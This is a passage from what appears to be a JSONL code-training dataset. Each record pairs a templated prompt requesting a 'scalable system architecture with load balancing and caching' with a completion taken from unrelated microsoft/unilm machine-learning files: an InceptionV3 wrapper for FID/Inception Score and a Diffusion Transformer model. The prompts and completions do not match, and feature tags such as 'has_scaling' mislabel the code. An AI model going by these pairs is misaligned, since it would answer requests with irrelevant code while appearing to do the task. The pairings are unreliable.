compute_inception_score_from_dataset(dataset,\r\n                                                splits,\r\n                                                batch_size,\r\n                                                device,\r\n                                                inception_model,\r\n                                                disable_tqdm)\r\n", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/metrics/IS.py", "language": "python", "complexity": "simple", "star_count": 21572, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 100}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"https://github.com/mseitzer/pytorch-fid/blob/master/src/pytorch_fid/inception.py\r\n\"\"\"\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nimport torchvision\r\n\r\nfrom torch.utils.model_zoo import load_url\r\n\r\n# Inception weights ported to Pytorch from\r\n# http://download.tensorflow.org/models/image/imagenet/inception-2015-12-05.tgz\r\nFID_WEIGHTS_URL = 'https://github.com/mseitzer/pytorch-fid/releases/download/fid_weights/pt_inception-2015-12-05-6726825d.pth'  # noqa: E501\r\n\r\n\r\nclass InceptionV3(nn.Module):\r\n    \"\"\"Pretrained InceptionV3 network returning feature maps\"\"\"\r\n\r\n    # Index of default block of inception to return,\r\n    # corresponds to output of final average pooling\r\n    DEFAULT_BLOCK_INDEX = 3\r\n\r\n    # Maps feature dimensionality to their output blocks indices\r\n    BLOCK_INDEX_BY_DIM = {\r\n        64: 0,   # First max pooling features\r\n        192: 1,  # Second max pooling featurs\r\n        768: 2,  # Pre-aux classifier features\r\n        2048: 3  # Final average pooling features\r\n    }\r\n\r\n    def __init__(self,\r\n                 output_blocks=[DEFAULT_BLOCK_INDEX],\r\n                 resize_input=True,\r\n                 normalize_input=True,\r\n                 requires_grad=False,\r\n                 use_fid_inception=True):\r\n        \"\"\"Build pretrained InceptionV3\r\n\r\n        Parameters\r\n        ----------\r\n        output_blocks : list of int\r\n            Indices of blocks to return features of. Possible values are:\r\n                - 0: corresponds to output of first max pooling\r\n                - 1: corresponds to output of second max pooling\r\n                - 2: corresponds to output which is fed to aux classifier\r\n                - 3: corresponds to output of final average pooling\r\n        resize_input : bool\r\n            If true, bilinearly resizes input to width and height 299 before\r\n            feeding input to model. As the network without fully connected\r\n            layers is fully convolutional, it should be able to handle inputs\r\n            of arbitrary size, so resizing might not be strictly needed\r\n        normalize_input : bool\r\n            If true, scales the input from range (0, 1) to the range the\r\n            pretrained Inception network expects, namely (-1, 1)\r\n        requires_grad : bool\r\n            If true, parameters of the model require gradients. Possibly useful\r\n            for finetuning the network\r\n        use_fid_inception : bool\r\n            If true, uses the pretrained Inception model used in Tensorflow's\r\n            FID implementation. If false, uses the pretrained Inception model\r\n            available in torchvision. The FID Inception model has different\r\n            weights and a slightly different structure from torchvision's\r\n            Inception model. If you want to compute FID scores, you are\r\n            strongly advised to set this parameter to true to get comparable\r\n            results.\r\n        \"\"\"\r\n        super(InceptionV3, self).__init__()\r\n\r\n        self.resize_input = resize_input\r\n        self.normalize_input = normalize_input\r\n        self.output_blocks = sorted(output_blocks)\r\n        self.last_needed_block = max(output_blocks)\r\n\r\n        assert self.last_needed_block <= 3, \\\r\n            'Last possible output block index is 3'\r\n\r\n        self.blocks = nn.ModuleList()\r\n\r\n        if use_fid_inception:\r\n            inception = fid_inception_v3()\r\n        else:\r\n            inception = _inception_v3(pretrained=True)\r\n\r\n        # Block 0: input to maxpool1\r\n        block0 = [\r\n            inception.Conv2d_1a_3x3,\r\n            inception.Conv2d_2a_3x3,\r\n            inception.Conv2d_2b_3x3,\r\n            nn.MaxPool2d(kernel_size=3, stride=2)\r\n        ]\r\n        self.blocks.append(nn.Sequential(*block0))\r\n\r\n        # Block 1: maxpool1 to maxpool2\r\n        if self.last_needed_block >= 1:\r\n            block1 = [\r\n                inception.Conv2d_3b_1x1,\r\n                inception.Conv2d_4a_3x3,\r\n                nn.MaxPool2d(kernel_size=3, stride=2)\r\n            ]\r\n            self.blocks.append(nn.Sequential(*block1))\r\n\r\n        # Block 2: maxpool2 to aux classifier\r\n        if self.last_needed_block >= 2:\r\n            block2 = [\r\n                inception.Mixed_5b,\r\n                inception.Mixed_5c,\r\n                inception.Mixed_5d,\r\n                inception.Mixed_6a,\r\n                inception.Mixed_6b,\r\n                inception.Mixed_6c,\r\n                inception.Mixed_6d,\r\n                inception.Mixed_6e,\r\n            ]\r\n            self.blocks.append(nn.Sequential(*block2))\r\n\r\n        # Block 3: aux classifier to final avgpool\r\n        if self.last_needed_block >= 3:\r\n            block3 = [\r\n                inception.Mixed_7a,\r\n                inception.Mixed_7b,\r\n                inception.Mixed_7c,\r\n                nn.AdaptiveAvgPool2d(output_size=(1, 1))\r\n            ]\r\n            self.blocks.append(nn.Sequential(*block3))\r\n\r\n        self.fc = nn.Linear(2048, 1008, bias=True)\r\n        with torch.no_grad():\r\n            self.fc.weight.copy_(inception.fc.weight)\r\n            self.fc.bias.copy_(inception.fc.bias)\r\n\r\n        for param in self.parameters():\r\n            param.requires_grad = requires_grad\r\n\r\n    def forward(self, inp, return_logits=False):\r\n        \"\"\"Get Inception feature maps\r\n\r\n        Parameters\r\n        ----------\r\n        inp : torch.autograd.Variable\r\n            Input tensor of shape Bx3xHxW. Values are expected to be in\r\n            range (0, 1)\r\n\r\n        Returns\r\n        -------\r\n        List of torch.autograd.Variable, corresponding to the selected output\r\n        block, sorted ascending by index\r\n        \"\"\"\r\n        outp = []\r\n        x = inp\r\n\r\n        if self.resize_input:\r\n            x = F.interpolate(x,\r\n                              size=(299, 299),\r\n                              mode='bilinear',\r\n                              align_corners=False)\r\n\r\n        if self.normalize_input:\r\n            x = 2 * x - 1  # Scale from range (0, 1) to range (-1, 1)\r\n\r\n        for idx, block in enumerate(self.blocks):\r\n            x = block(x)\r\n            if idx in self.output_blocks:\r\n                outp.append(x)\r\n\r\n            # if idx == self.last_needed_block:\r\n            #     break\r\n\r\n        if return_logits:\r\n            x = F.dropout(x, training=False)\r\n            x = torch.flatten(x, 1)\r\n            logit = self.fc(x)\r\n            return outp, logit\r\n        else:\r\n            return outp\r\n\r\n\r\ndef _inception_v3(*args, **kwargs):\r\n    \"\"\"Wraps `torchvision.models.inception_v3`\r\n\r\n    Skips default weight inititialization if supported by torchvision version.\r\n    See https://github.com/mseitzer/pytorch-fid/issues/28.\r\n    \"\"\"\r\n    kwargs['init_weights'] = False\r\n\r\n    return torchvision.models.inception_v3(*args, **kwargs)\r\n\r\n\r\ndef fid_inception_v3():\r\n    \"\"\"Build pretrained Inception model for FID computation\r\n\r\n    The Inception model for FID computation uses a different set of weights\r\n    and has a slightly different structure than torchvision's Inception.\r\n\r\n    This method first constructs torchvision's Inception and then patches the\r\n    necessary parts that are different in the FID Inception model.\r\n    \"\"\"\r\n    inception = _inception_v3(num_classes=1008,\r\n                              aux_logits=False,\r\n                              pretrained=False)\r\n    inception.Mixed_5b = FIDInceptionA(192, pool_features=32)\r\n    inception.Mixed_5c = FIDInceptionA(256, pool_features=64)\r\n    inception.Mixed_5d = FIDInceptionA(288, pool_features=64)\r\n    inception.Mixed_6b = FIDInceptionC(768, channels_7x7=128)\r\n    inception.Mixed_6c = FIDInceptionC(768, channels_7x7=160)\r\n    inception.Mixed_6d = FIDInceptionC(768, channels_7x7=160)\r\n    inception.Mixed_6e = FIDInceptionC(768, channels_7x7=192)\r\n    inception.Mixed_7b = FIDInceptionE_1(1280)\r\n    inception.Mixed_7c = FIDInceptionE_2(2048)\r\n\r\n    state_dict = load_url(FID_WEIGHTS_URL, progress=True)\r\n    inception.load_state_dict(state_dict)\r\n    return inception\r\n\r\n\r\nclass FIDInceptionA(torchvision.models.inception.InceptionA):\r\n    \"\"\"InceptionA block patched for FID computation\"\"\"\r\n    def __init__(self, in_channels, pool_features):\r\n        super(FIDInceptionA, self).__init__(in_channels, pool_features)\r\n\r\n    def forward(self, x):\r\n        branch1x1 = self.branch1x1(x)\r\n\r\n        branch5x5 = self.branch5x5_1(x)\r\n        branch5x5 = self.branch5x5_2(branch5x5)\r\n\r\n        branch3x3dbl = self.branch3x3dbl_1(x)\r\n        branch3x3dbl = self.branch3x3dbl_2(branch3x3dbl)\r\n        branch3x3dbl = self.branch3x3dbl_3(branch3x3dbl)\r\n\r\n        # Patch: Tensorflow's average pool does not use the padded zero's in\r\n        # its average calculation\r\n        branch_pool = F.avg_pool2d(x, kernel_size=3, stride=1, padding=1,\r\n                                   count_include_pad=False)\r\n        branch_pool = self.branch_pool(branch_pool)\r\n\r\n        outputs = [branch1x1, branch5x5, branch3x3dbl, branch_pool]\r\n        return torch.cat(outputs, 1)\r\n\r\n\r\nclass FIDInceptionC(torchvision.models.inception.InceptionC):\r\n    \"\"\"InceptionC block patched for FID computation\"\"\"\r\n    def __init__(self, in_channels, channels_7x7):\r\n        super(FIDInceptionC, self).__init__(in_channels, channels_7x7)\r\n\r\n    def forward(self, x):\r\n        branch1x1 = self.branch1x1(x)\r\n\r\n        branch7x7 = self.branch7x7_1(x)\r\n        branch7x7 = self.branch7x7_2(branch7x7)\r\n        branch7x7 = self.branch7x7_3(branch7x7)\r\n\r\n        branch7x7dbl = self.branch7x7dbl_1(x)\r\n        branch7x7dbl = self.branch7x7dbl_2(branch7x7dbl)\r\n        branch7x7dbl = self.branch7x7dbl_3(branch7x7dbl)\r\n        branch7x7dbl = self.branch7x7dbl_4(branch7x7dbl)\r\n        branch7x7dbl = self.branch7x7dbl_5(branch7x7dbl)\r\n\r\n        # Patch: Tensorflow's average pool does not use the padded zero's in\r\n        # its average calculation\r\n        branch_pool = F.avg_pool2d(x, kernel_size=3, stride=1, padding=1,\r\n                                   count_include_pad=False)\r\n        branch_pool = self.branch_pool(branch_pool)\r\n\r\n        outputs = [branch1x1, branch7x7, branch7x7dbl, branch_pool]\r\n        return torch.cat(outputs, 1)\r\n\r\n\r\nclass FIDInceptionE_1(torchvision.models.inception.InceptionE):\r\n    \"\"\"First InceptionE block patched for FID computation\"\"\"\r\n    def __init__(self, in_channels):\r\n        super(FIDInceptionE_1, self).__init__(in_channels)\r\n\r\n    def forward(self, x):\r\n        branch1x1 = self.branch1x1(x)\r\n\r\n        branch3x3 = self.branch3x3_1(x)\r\n        branch3x3 = [\r\n            self.branch3x3_2a(branch3x3),\r\n            self.branch3x3_2b(branch3x3),\r\n        ]\r\n        branch3x3 = torch.cat(branch3x3, 1)\r\n\r\n        branch3x3dbl = self.branch3x3dbl_1(x)\r\n        branch3x3dbl = self.branch3x3dbl_2(branch3x3dbl)\r\n        branch3x3dbl = [\r\n            self.branch3x3dbl_3a(branch3x3dbl),\r\n            self.branch3x3dbl_3b(branch3x3dbl),\r\n        ]\r\n        branch3x3dbl = torch.cat(branch3x3dbl, 1)\r\n\r\n        # Patch: Tensorflow's average pool does not use the padded zero's in\r\n        # its average calculation\r\n        branch_pool = F.avg_pool2d(x, kernel_size=3, stride=1, padding=1,\r\n                                   count_include_pad=False)\r\n        branch_pool = self.branch_pool(branch_pool)\r\n\r\n        outputs = [branch1x1, branch3x3, branch3x3dbl, branch_pool]\r\n        return torch.cat(outputs, 1)\r\n\r\n\r\nclass FIDInceptionE_2(torchvision.models.inception.InceptionE):\r\n    \"\"\"Second InceptionE block patched for FID computation\"\"\"\r\n    def __init__(self, in_channels):\r\n        super(FIDInceptionE_2, self).__init__(in_channels)\r\n\r\n    def forward(self, x):\r\n        branch1x1 = self.branch1x1(x)\r\n\r\n        branch3x3 = self.branch3x3_1(x)\r\n        branch3x3 = [\r\n            self.branch3x3_2a(branch3x3),\r\n            self.branch3x3_2b(branch3x3),\r\n        ]\r\n        branch3x3 = torch.cat(branch3x3, 1)\r\n\r\n        branch3x3dbl = self.branch3x3dbl_1(x)\r\n        branch3x3dbl = self.branch3x3dbl_2(branch3x3dbl)\r\n        branch3x3dbl = [\r\n            self.branch3x3dbl_3a(branch3x3dbl),\r\n            self.branch3x3dbl_3b(branch3x3dbl),\r\n        ]\r\n        branch3x3dbl = torch.cat(branch3x3dbl, 1)\r\n\r\n        # Patch: The FID Inception model uses max pooling instead of average\r\n        # pooling. This is likely an error in this specific Inception\r\n        # implementation, as other Inception models use average pooling here\r\n        # (which matches the description in the paper).\r\n        branch_pool = F.max_pool2d(x, kernel_size=3, stride=1, padding=1)\r\n        branch_pool = self.branch_pool(branch_pool)\r\n\r\n        outputs = [branch1x1, branch3x3, branch3x3dbl, branch_pool]\r\n        return torch.cat(outputs, 1)\r\n", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/metrics/inception.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 332}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) Meta Platforms, Inc. and affiliates.\r\n# All rights reserved.\r\n\r\n# This source code is licensed under the license found in the\r\n# LICENSE file in the root directory of this source tree.\r\n# --------------------------------------------------------\r\n# References:\r\n# GLIDE: https://github.com/openai/glide-text2im\r\n# MAE: https://github.com/facebookresearch/mae/blob/main/models_mae.py\r\n# --------------------------------------------------------\r\nimport functools\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nimport numpy as np\r\nimport math\r\nfrom timm.models.vision_transformer import PatchEmbed\r\nfrom .RMSNorm import RMSNorm\r\n\r\n\r\ndef modulate(x, shift, scale):\r\n    return x * (1 + scale) + shift\r\n\r\n\r\n#################################################################################\r\n#               Embedding Layers for Timesteps and Class Labels                 #\r\n#################################################################################\r\n\r\nclass TimestepEmbedder(nn.Module):\r\n    \"\"\"\r\n    Embeds scalar timesteps into vector representations.\r\n    \"\"\"\r\n    def __init__(self, hidden_size, frequency_embedding_size=256):\r\n        super().__init__()\r\n        self.mlp = nn.Sequential(\r\n            nn.Linear(frequency_embedding_size, hidden_size, bias=False),\r\n            nn.SiLU(),\r\n            nn.Linear(hidden_size, hidden_size, bias=False),\r\n        )\r\n        self.frequency_embedding_size = frequency_embedding_size\r\n\r\n    @staticmethod\r\n    def timestep_embedding(t, dim, max_period=10000):\r\n        \"\"\"\r\n        Create sinusoidal timestep embeddings.\r\n        :param t: a 1-D Tensor of N indices, one per batch element.\r\n                          These may be fractional.\r\n        :param dim: the dimension of the output.\r\n        :param max_period: controls the minimum frequency of the embeddings.\r\n        :return: an (N, D) Tensor of positional embeddings.\r\n        \"\"\"\r\n        # https://github.com/openai/glide-text2im/blob/main/glide_text2im/nn.py\r\n        half = dim // 2\r\n        freqs = torch.exp(\r\n            -math.log(max_period) * torch.arange(start=0, end=half, dtype=torch.float32) / half\r\n        ).to(t.device)\r\n        args = t[:, None].float() * freqs[None]\r\n        embedding = torch.cat([torch.cos(args), torch.sin(args)], dim=-1)\r\n        if dim % 2:\r\n            embedding = torch.cat([embedding, torch.zeros_like(embedding[:, :1])], dim=-1)\r\n        return embedding.to(t.dtype)\r\n\r\n    def forward(self, t):\r\n        t_freq = self.timestep_embedding(t, self.frequency_embedding_size)\r\n        t_emb = self.mlp(t_freq)\r\n        return t_emb\r\n\r\n\r\nclass LabelEmbedder(nn.Module):\r\n    \"\"\"\r\n    Embeds class labels into vector representations. Also handles label dropout for classifier-free guidance.\r\n    \"\"\"\r\n    def __init__(self, num_classes, hidden_size, dropout_prob):\r\n        super().__init__()\r\n        use_cfg_embedding = dropout_prob > 0\r\n        self.embedding_table = nn.Embedding(num_classes + use_cfg_embedding, hidden_size)\r\n        self.num_classes = num_classes\r\n        self.dropout_prob = dropout_prob\r\n\r\n    def token_drop(self, labels, force_drop_ids=None):\r\n        \"\"\"\r\n        Drops labels to enable classifier-free guidance.\r\n        \"\"\"\r\n        if force_drop_ids is None:\r\n            drop_ids = torch.rand(labels.shape[0], device=labels.device) < self.dropout_prob\r\n        else:\r\n            drop_ids = force_drop_ids == 1\r\n        labels = torch.where(drop_ids, self.num_classes, labels)\r\n        return labels\r\n\r\n    def forward(self, labels, train, force_drop_ids=None):\r\n        use_dropout = self.dropout_prob > 0\r\n        if (train and use_dropout) or (force_drop_ids is not None):\r\n            labels = self.token_drop(labels, force_drop_ids)\r\n        embeddings = self.embedding_table(labels)\r\n        return embeddings\r\n\r\n\r\nclass SwiGLU(nn.Module):\r\n    def __init__(\r\n        self,\r\n        embed_dim,\r\n        ffn_dim,\r\n        drop=0.,\r\n    ):\r\n        super().__init__()\r\n        self.embed_dim = embed_dim\r\n        self.fc1 = nn.Linear(self.embed_dim, ffn_dim, bias=False)\r\n        self.gate = nn.Linear(self.embed_dim, ffn_dim, bias=False)\r\n        self.fc2 = nn.Linear(ffn_dim, self.embed_dim, bias=False)\r\n        self.drop = nn.Dropout(drop)\r\n\r\n    def forward(self, x):\r\n        x_shape = x.shape\r\n        x = x.reshape(-1, x.size(-1))\r\n        x = F.silu(self.fc1(x)) * self.gate(x)\r\n        x = self.drop(x)\r\n        x = self.fc2(x)\r\n        x = self.drop(x)\r\n        output = x.view(x_shape)\r\n        return output\r\n    \r\n#################################################################################\r\n#                                 Core DiT Model                                #\r\n#################################################################################\r\nclass Attention(nn.Module):\r\n    def __init__(self, dim, num_heads=8, num_kv_heads=8, qkv_bias=False, attn_drop=0., proj_drop=0.):\r\n        super().__init__()\r\n        self.dim = dim\r\n        self.head_dim = dim // num_heads\r\n        self.num_heads = num_heads\r\n        self.num_kv_heads = num_kv_heads\r\n        self.n_rep = num_heads // num_kv_heads\r\n        head_dim = dim // num_heads\r\n        self.scale = head_dim ** -0.5\r\n\r\n        self.qkv = nn.Linear(dim, dim + 2 * self.num_kv_heads * self.head_dim, bias=qkv_bias)\r\n        self.attn_drop = nn.Dropout(attn_drop)\r\n        self.proj = nn.Linear(dim, dim, bias=False)\r\n        self.proj_drop = nn.Dropout(proj_drop)\r\n\r\n    def forward(self, x):\r\n        B, N, C = x.shape\r\n        qkv = self.qkv(x).reshape(B, N, self.num_heads + 2 * self.num_kv_heads, self.head_dim)\r\n        q, k, v = torch.split(qkv, [self.num_heads, self.num_kv_heads, self.num_kv_heads], dim=2)\r\n        q, k, v = q.transpose(1, 2), k.transpose(1, 2), v.transpose(1, 2)\r\n        x = F.scaled_dot_product_attention(\r\n            q, k, v,\r\n            dropout_p=self.attn_drop.p if self.training else 0.,\r\n        )\r\n\r\n        x = x.transpose(1, 2).reshape(B, N, C)\r\n        x = self.proj(x)\r\n        x = self.proj_drop(x)\r\n        return x\r\n    \r\nclass DiTBlock(nn.Module):\r\n    \"\"\"\r\n    A DiT block with adaptive layer norm zero (adaLN-Zero) conditioning.\r\n    \"\"\"\r\n    def __init__(self, hidden_size, num_heads, num_kv_heads, mlp_ratio=4.0, proj_drop=0., attn_drop=0., **block_kwargs):\r\n        super().__init__()\r\n        self.norm1 = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        self.attn = Attention(hidden_size, num_heads=num_heads, num_kv_heads=num_kv_heads, qkv_bias=False, proj_drop=proj_drop, attn_drop=attn_drop, **block_kwargs)\r\n        self.norm2 = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        mlp_hidden_dim = int(hidden_size * mlp_ratio * 2 / 3 / 64) * 64\r\n        self.mlp = SwiGLU(hidden_size, mlp_hidden_dim, drop=proj_drop)\r\n        self.adaLN_modulation = nn.Sequential(\r\n            nn.SiLU(),\r\n            nn.Linear(hidden_size, 6 * hidden_size, bias=False)\r\n        )\r\n\r\n    def forward(self, x, c):\r\n        shift_msa, scale_msa, gate_msa, shift_mlp, scale_mlp, gate_mlp = self.adaLN_modulation(c).chunk(6, dim=-1)\r\n        x = x + gate_msa * self.attn(modulate(self.norm1(x), shift_msa, scale_msa))\r\n        x = x + gate_mlp * self.mlp(modulate(self.norm2(x), shift_mlp, scale_mlp))\r\n        return x\r\n\r\n\r\nclass FinalLayer(nn.Module):\r\n    \"\"\"\r\n    The final layer of DiT.\r\n    \"\"\"\r\n    def __init__(self, hidden_size, output_size):\r\n        super().__init__()\r\n        self.norm_final = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        self.linear = nn.Linear(hidden_size, output_size, bias=False)\r\n        self.adaLN_modulation = nn.Sequential(\r\n            nn.SiLU(),\r\n            nn.Linear(hidden_size, 2 * hidden_size, bias=False)\r\n        )\r\n\r\n    def forward(self, x, c):\r\n        shift, scale = self.adaLN_modulation(c).chunk(2, dim=-1)\r\n        x = modulate(self.norm_final(x), shift, scale)\r\n        x = self.linear(x)\r\n        return x\r\n\r\n\r\nclass DiT(nn.Module):\r\n    \"\"\"\r\n    Diffusion model with a Transformer backbone.\r\n    \"\"\"\r\n    def __init__(\r\n        self,\r\n        input_size=32,\r\n        patch_size=1,\r\n        flatten_input=False,\r\n        in_channels=4,\r\n        hidden_size=1152,\r\n        depth=28,\r\n        num_heads=16,\r\n        num_kv_heads=None,\r\n        mlp_ratio=4.0,\r\n        class_dropout_prob=0.1,\r\n        num_classes=1000,\r\n        drop=0.0,\r\n        norm_layer=None\r\n    ):\r\n        super().__init__()\r\n        self.in_channels = in_channels\r\n        self.out_channels = in_channels\r\n        self.input_size = input_size\r\n        self.patch_size = patch_size if not flatten_input else 1\r\n        self.num_heads = num_heads\r\n        self.num_kv_heads = num_kv_heads if num_kv_heads is not None else num_heads\r\n        self.flatten_input_size = input_size * input_size // self.patch_size // self.patch_size\r\n        self.flatten_input = flatten_input\r\n\r\n        self.x_embedder = PatchEmbed(input_size, patch_size, in_channels, hidden_size, strict_img_size=False, norm_layer=norm_layer) if not flatten_input else nn.Linear(in_channels, hidden_size, bias=False)\r\n        self.t_embedder = TimestepEmbedder(hidden_size)\r\n        self.y_embedder = LabelEmbedder(num_classes, hidden_size, class_dropout_prob)\r\n        # Will use fixed sin-cos embedding:\r\n        self.pos_embed = nn.Parameter(torch.zeros(1, self.flatten_input_size, hidden_size), requires_grad=False)\r\n\r\n        self.blocks = nn.ModuleList([\r\n            DiTBlock(hidden_size, self.num_heads, self.num_kv_heads, mlp_ratio=mlp_ratio, proj_drop=drop, attn_drop=drop) for _ in range(depth)\r\n        ])\r\n        self.final_layer = FinalLayer(hidden_size, self.patch_size * self.patch_size * self.out_channels)\r\n        self.initialize_weights()\r\n        \r\n    @property\r\n    def device(self):\r\n        return next(self.parameters()).device\r\n\r\n    @property\r\n    def dtype(self):\r\n        return next(self.parameters()).dtype\r\n\r\n    def initialize_weights(self):\r\n        # Initialize transformer layers:\r\n        def _basic_init(module):\r\n            if isinstance(module, nn.Linear):\r\n                if module.bias is not None:\r\n                    nn.init.constant_(module.bias, 0)\r\n        self.apply(_basic_init)\r\n\r\n        # Initialize (and freeze) pos_embed by sin-cos embedding:\r\n        pos_embed = get_2d_sincos_pos_embed(self.pos_embed.shape[-1], int(self.x_embedder.num_patches ** 0.5)) if not self.flatten_input \\\r\n            else get_1d_sincos_pos_embed(self.pos_embed.shape[-1], self.flatten_input_size)\r\n        self.pos_embed.data.copy_(torch.from_numpy(pos_embed).float().unsqueeze(0))\r\n\r\n        # Initialize patch_embed like nn.Linear (instead of nn.Conv2d):\r\n        if not self.flatten_input:\r\n            nn.init.constant_(self.x_embedder.proj.bias, 0)\r\n\r\n        # Initialize label embedding table:\r\n        nn.init.normal_(self.y_embedder.embedding_table.weight, std=0.02)\r\n\r\n        # Initialize timestep embedding MLP:\r\n        nn.init.normal_(self.t_embedder.mlp[0].weight, std=0.02)\r\n        nn.init.normal_(self.t_embedder.mlp[2].weight, std=0.02)\r\n\r\n        # Zero-out adaLN modulation layers in DiT blocks:\r\n        for block in self.blocks:\r\n            nn.init.constant_(block.adaLN_modulation[-1].weight, 0)\r\n\r\n        # Zero-out output layers:\r\n        nn.init.constant_(self.final_layer.adaLN_modulation[-1].weight, 0)\r\n        nn.init.constant_(self.final_layer.linear.weight, 0)\r\n\r\n    def unpatchify(self, x):\r\n        \"\"\"\r\n        x: (N, T, patch_size**2 * C)\r\n        imgs: (N, H, W, C)\r\n        \"\"\"\r\n        c = self.out_channels\r\n        p = self.x_embedder.patch_size[0]\r\n        h = w = int(x.shape[1] ** 0.5)\r\n        assert h * w == x.shape[1]\r\n\r\n        x = x.reshape(shape=(x.shape[0], h, w, p, p, c))\r\n        x = torch.einsum('nhwpqc->nchpwq', x)\r\n        imgs = x.reshape(shape=(x.shape[0], c, h * p, h * p))\r\n        return imgs\r\n\r\n    def forward(self, x_noise, t, y, **kwargs):\r\n        \"\"\"\r\n        Forward pass of DiT.\r\n        x: (N, C, H, W) tensor of spatial inputs (images or latent representations of images)\r\n        t: (N,) tensor of diffusion timesteps\r\n        y: (N,) tensor of class labels\r\n        \"\"\"\r\n        x = self.x_embedder(x_noise) + self.pos_embed  # (N, T, D), where T = H * W / patch_size ** 2\r\n        t = self.t_embedder(t)                   # (N, D)\r\n        y = self.y_embedder(y, self.training)    # (N, D)\r\n        c = (t + y).unsqueeze(1)                 # (N, D)\r\n        for block in self.blocks:\r\n            x = block(x, c)                      # (N, T, D)\r\n        x = self.final_layer(x, c)               # (N, T, patch_size ** 2 * out_channels)\r\n        if not self.flatten_input:\r\n            x = self.unpatchify(x)               # (N, out_channels, H, W)\r\n        return x\r\n    \r\n    def sample_with_cfg(self, y, cfg_scale, sample_func):\r\n        bsz = y.shape[0]\r\n        z = torch.randn(bsz, self.in_channels, self.input_size, self.input_size, device=self.device, dtype=self.dtype) if not self.flatten_input else torch.randn(bsz, self.flatten_input_size, self.in_channels, device=self.device, dtype=self.dtype)\r\n        samples = sample_func(functools.partial(self.forward_with_cfg, y=y, cfg_scale=cfg_scale), z)\r\n        samples, _ = samples.chunk(2, dim=0)\r\n        return samples\r\n\r\n    def forward_with_cfg(self, x, t, y, cfg_scale):\r\n        \"\"\"\r\n        Forward pass of DiT, but also batches the unconditional forward pass for classifier-free guidance.\r\n        \"\"\"\r\n        # https://github.com/openai/glide-text2im/blob/main/notebooks/text2im.ipynb\r\n        half = x[: len(x) // 2]\r\n        combined = torch.cat([half, half], dim=0)\r\n        eps = self.forward(combined, t, y)\r\n        cond_eps, uncond_eps = torch.split(eps, len(eps) // 2, dim=0)\r\n        half_eps = uncond_eps + cfg_scale * (cond_eps - uncond_eps)\r\n        eps = torch.cat([half_eps, half_eps], dim=0)\r\n        return eps\r\n\r\n\r\n#################################################################################\r\n#                   Sine/Cosine Positional Embedding Functions                  #\r\n#################################################################################\r\n# https://github.com/facebookresearch/mae/blob/main/util/pos_embed.py\r\n\r\ndef get_2d_sincos_pos_embed(embed_dim, grid_size, cls_token=False, extra_tokens=0):\r\n    \"\"\"\r\n    grid_size: int of the grid height and width\r\n    return:\r\n    pos_embed: [grid_size*grid_size, embed_dim] or [1+grid_size*grid_size, embed_dim] (w/ or w/o cls_token)\r\n    \"\"\"\r\n    grid_h = np.arange(grid_size, dtype=np.float32)\r\n    grid_w = np.arange(grid_size, dtype=np.float32)\r\n    grid = np.meshgrid(grid_w, grid_h)  # here w goes first\r\n    grid = np.stack(grid, axis=0)\r\n\r\n    grid = grid.reshape([2, 1, grid_size, grid_size])\r\n    pos_embed = get_2d_sincos_pos_embed_from_grid(embed_dim, grid)\r\n    if cls_token and extra_tokens > 0:\r\n        pos_embed = np.concatenate([np.zeros([extra_tokens, embed_dim]), pos_embed], axis=0)\r\n    return pos_embed\r\n\r\ndef get_1d_sincos_pos_embed(embed_dim, seq_len, cls_token=False, extra_tokens=0):\r\n    \"\"\"\r\n    seq_len: int of the sequence length\r\n    return:\r\n    pos_embed: [seq_len, embed_dim] or [1+seq_len, embed_dim] (w/ or w/o cls_token)\r\n    \"\"\"\r\n    pos = np.arange(seq_len, dtype=np.float32)\r\n    pos_embed = get_1d_sincos_pos_embed_from_grid(embed_dim, pos)\r\n    if cls_token and extra_tokens > 0:\r\n        pos_embed = np.concatenate([np.zeros([extra_tokens, embed_dim]), pos_embed], axis=0)\r\n    return pos_embed\r\n\r\ndef get_2d_sincos_pos_embed_from_grid(embed_dim, grid):\r\n    assert embed_dim % 2 == 0\r\n\r\n    # use half of dimensions to encode grid_h\r\n    emb_h = get_1d_sincos_pos_embed_from_grid(embed_dim // 2, grid[0])  # (H*W, D/2)\r\n    emb_w = get_1d_sincos_pos_embed_from_grid(embed_dim // 2, grid[1])  # (H*W, D/2)\r\n\r\n    emb = np.concatenate([emb_h, emb_w], axis=1) # (H*W, D)\r\n    return emb\r\n\r\n\r\ndef get_1d_sincos_pos_embed_from_grid(embed_dim, pos):\r\n    \"\"\"\r\n    embed_dim: output dimension for each position\r\n    pos: a list of positions to be encoded: size (M,)\r\n    out: (M, D)\r\n    \"\"\"\r\n    assert embed_dim % 2 == 0\r\n    omega = np.arange(embed_dim // 2, dtype=np.float64)\r\n    omega /= embed_dim / 2.\r\n    omega = 1. / 10000**omega  # (D/2,)\r\n\r\n    pos = pos.reshape(-1)  # (M,)\r\n    out = np.einsum('m,d->md', pos, omega)  # (M, D/2), outer product\r\n\r\n    emb_sin = np.sin(out) # (M, D/2)\r\n    emb_cos = np.cos(out) # (M, 